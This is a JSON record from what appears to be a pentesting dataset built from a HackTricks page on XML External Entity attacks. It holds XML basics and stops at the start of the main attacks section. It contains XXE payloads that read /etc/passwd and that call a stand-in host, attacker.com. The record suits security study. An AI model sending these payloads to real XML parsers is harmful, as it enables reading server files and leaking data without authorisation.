{
  "id": "pentesting_web_f962f44f3462",
  "category": "pentesting-web",
  "title": "xxe xee xml external entity",
  "description": "# XXE - XEE - XML External Entity\n\n{{#include ../banners/hacktricks-training.md}}\n\n## XML Basics\n\nXML is a markup language designed for data storage and transport, featuring a flexible structure that allows for the use of descriptively named tags. It differs from HTML by not being limited to a set of predefined tags. XML's significance has declined with the rise of JSON, despite its initial role in AJAX technology.\n\n- **Data Representation through Entities**: Entities in XML enable the represent",
  "payloads": [
    "# XXE - XEE - XML External Entity",
    "{{#include ../banners/hacktricks-training.md}}",
    "## XML Basics",
    "XML is a markup language designed for data storage and transport, featuring a flexible structure that allows for the use of descriptively named tags. It differs from HTML by not being limited to a set of predefined tags. XML's significance has declined with the rise of JSON, despite its initial role in AJAX technology.",
    "- **Data Representation through Entities**: Entities in XML enable the representation of data, including special characters like `&lt;` and `&gt;`, which correspond to `<` and `>` to avoid conflict with XML's tag system.",
    "- **Defining XML Elements**: XML allows for the definition of element types, outlining how elements should be structured and what content they may contain, ranging from any type of content to specific child elements.",
    "- **Document Type Definition (DTD)**: DTDs are crucial in XML for defining the document's structure and the types of data it can contain. They can be internal, external, or a combination, guiding how documents are formatted and validated.",
    "- **Custom and External Entities**: XML supports the creation of custom entities within a DTD for flexible data representation. External entities, defined with a URL, raise security concerns, particularly in the context of XML External Entity (XXE) attacks, which exploit the way XML parsers handle external data sources: `<!DOCTYPE foo [ <!ENTITY myentity \"value\" > ]>`",
    "- **XXE Detection with Parameter Entities**: For detecting XXE vulnerabilities, especially when conventional methods fail due to parser security measures, XML parameter entities can be utilized. These entities allow for out-of-band detection techniques, such as triggering DNS lookups or HTTP requests to a controlled domain, to confirm the vulnerability.",
    "- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM \"file:///etc/passwd\" > ]>`",
    "- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM \"http://attacker.com\" > ]>`",
    "## Main attacks",
    "[**Most of these attacks were tested using the awesome Portswiggers XEE labs: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)",
    "### New Entity test",
    "In this attack I'm going to test if a simple new ENTITY declaration is working"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/pentesting-web/xxe-xee-xml-external-entity.md"
  ]
}